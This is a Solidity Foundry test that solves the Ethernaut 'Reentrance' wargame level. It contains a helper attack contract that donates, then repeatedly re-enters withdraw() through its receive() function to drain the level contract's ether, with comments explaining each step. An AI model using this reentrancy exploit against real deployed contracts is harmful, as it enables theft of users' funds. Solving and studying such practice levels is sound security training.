// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/10-ReentranceFactory.sol";

contract ReentranceHackHelperContract {
    Reentrance private reentranceContract;
    uint256 donationAmount;

    constructor(address _reentranceContractAddress) {
        reentranceContract = Reentrance(payable(_reentranceContractAddress));
    }

    function attack() public payable {
        donationAmount = msg.value;
        reentranceContract.donate{value: donationAmount}(address(this));
        triggerWithdraw();
    }

    function triggerWithdraw() private {
        uint256 contractBalance = address(reentranceContract).balance;
        if (contractBalance > 0) {
            reentranceContract.withdraw(
                donationAmount < contractBalance
                    ? donationAmount
                    : contractBalance
            );
        }
    }

    receive() external payable {
        triggerWithdraw();
    }
}

contract ReentranceHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(factory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. Donate so that we can get into the `balances[msg.sender] >= _amount` in withdraw
        // 2. When `withdraw` (in `Reentrance` contract) triggers `msg.sender.call{value: _amount}("")`,
        // it will trigger withdraw in our ReentranceHackHelperContract's receive function
        // This will be called again and again until the contract is depleted
        // This attack is not possible if the `Reentrance` contract is compiled with Solidity ^0.8.0 (without unchecked)
        // because `balances[msg.sender] -= _amount` would revert with over/underflow error
        ReentranceHackHelperContract hackHelperContract = new ReentranceHackHelperContract(
                levelAddress
            );
        hackHelperContract.attack{value: 0.001 ether}();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
